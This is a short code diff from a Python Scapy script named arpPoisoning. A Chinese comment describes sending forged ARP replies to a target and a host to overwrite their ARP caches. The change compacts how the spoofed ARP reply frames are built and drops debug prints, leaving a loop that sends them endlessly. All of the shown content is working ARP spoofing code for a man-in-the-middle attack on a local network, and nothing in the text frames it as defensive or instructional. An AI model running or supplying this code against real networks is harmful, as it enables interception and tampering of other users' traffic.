@@ -11,14 +11,8 @@ def arpPoisoning(target_ip, host_ip):
         return None
 
     def poisoningDone(target_ip, target_mac, host_ip, host_mac):  # 向目标和主机发送伪造的ARP回复,更新目标和主机的ARP缓存
-        arp_target = ARP(op=2, pdst=target_ip, psrc=host_ip)
-        arp_host = ARP(op=2, pdst=host_ip, psrc=target_ip)
-
-        pkt_target = Ether(dst=target_mac) / arp_target
-        pkt_host = Ether(dst=host_mac) / arp_host
-
-        print(pkt_target.show())
-        print(pkt_target)
+        pkt_target = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=host_ip)
+        pkt_host = Ether(dst=host_mac) / ARP(op=2, pdst=host_ip, psrc=target_ip)
 
         while True:
             sendp(pkt_target, verbose=False)
